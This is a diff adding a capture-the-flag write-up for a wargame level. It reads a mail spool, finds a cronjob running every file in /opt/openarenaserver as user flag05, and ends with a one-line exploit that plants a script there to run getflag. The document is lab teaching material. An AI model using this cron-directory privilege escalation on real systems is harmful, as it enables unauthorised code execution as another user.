@@ -1,0 +1,25 @@
+For this level, we were great by a message: "You have a new mail".
+
+Normally, mails are located at either:
+"/var/spool/mail/$USER" or "/var/mail/$USER"
+
+"cat /var/spool/mail/level05" result: "*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05"
+
+We can see that it's a cronjob schedule. "*/2" in the beginning of the cronjob means that this job will be run every 2minutes. The following "*" means the job will be run every hour/day etc..
+
+Next, we can see that the cronjob will run: "su -c "sh /usr/sbin/openarenaserver" - flag05"
+It means that it will run "sh /usr/sbin/openarenaserver" as user flag05.
+
+Let's check the executable:
+"cat /usr/sbin/openarenaserver" result: "#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done"
+
+This script will run every file in "/opt/openarenaserver/" then remove it.
+
+So we can write our own script and put it into "/opt/openarenaserver/" and wait 2 minutes to let the cronjob do the task.
+
+`echo "/bin/getflag > /tmp/exploit_result" > /opt/openarenaserver/exploit_script`
